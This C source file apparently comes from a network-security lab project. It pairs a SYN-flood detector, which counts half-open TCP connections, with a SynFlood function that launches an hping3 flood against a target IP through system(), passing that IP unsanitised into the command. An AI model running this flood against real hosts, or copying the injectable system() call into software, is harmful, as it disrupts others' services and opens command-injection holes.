#include "SynFlood.h"
#include<stdio.h>
#include<stdlib.h>
#include<string.h>
#include<netinet/in.h>
#include<netinet/ip.h>
#include<netinet/tcp.h>
#include<net/ethernet.h>
#include<arpa/inet.h>
#include<unistd.h>

int syn_count=0;
int ack_count=0;
int threshold=100;

void check_syn_anomaly(const u_char *packet)
{
    struct ether_header *eth;
    eth=(struct ether_header *)packet;
    
    unsigned short ethType;
    ethType=ntohs(eth->ether_type);
    
    int ipProtoCheck;
    ipProtoCheck=ETHERTYPE_IP;
    
    if(ethType==ipProtoCheck)
    {
        struct ip *iph;
        int ethSize;
        ethSize=sizeof(struct ether_header);
        iph=(struct ip *)(packet+ethSize);
        
        int tcpProtoCheck;
        tcpProtoCheck=IPPROTO_TCP;
        
        int currentIpProto;
        currentIpProto=iph->ip_p;
        
        if(currentIpProto==tcpProtoCheck)
        {
            struct tcphdr *tcph;
            int ipHeaderLen;
            ipHeaderLen=iph->ip_hl*4;
            tcph=(struct tcphdr *)(packet+ethSize+ipHeaderLen);
            
            int synFlagCheck;
            synFlagCheck=tcph->th_flags&TH_SYN;
            
            int ackFlagCheck;
            ackFlagCheck=tcph->th_flags&TH_ACK;
            
            if(synFlagCheck!=0 && ackFlagCheck==0)
            {
                syn_count++;
            }
            else
            {
                if(ackFlagCheck!=0)
                {
                    ack_count++;
                }
            }
            
            int half_open_connections;
            half_open_connections=syn_count-ack_count;
            
            if(half_open_connections>threshold)
            {
                printf("\n[ALERT] Anomaly Detected! Possible SYN Flood Attack underway.\n");
                printf("Current Half-Open Connections: %d\n",half_open_connections);
                
                printf("GUI_ALERT|SYN_FLOOD|%d\n",half_open_connections);
                fflush(stdout); 
            }
        }
    }
}

void SynFlood(char *targetIP)
{
    printf("Simulating SYN Flood Attack on IP: %s\n",targetIP);
    char cmd[1000];
    char *cmdFormat = "PATH=/opt/homebrew/sbin:/usr/local/sbin:$PATH hping3 -S --flood -V -p 80 %s > /dev/null 2>&1 &";
    
    sprintf(cmd, cmdFormat, targetIP);
    system(cmd); 
    
    printf("[INFO] Stealth Attack Launched in background targeting %s\n", targetIP);
}
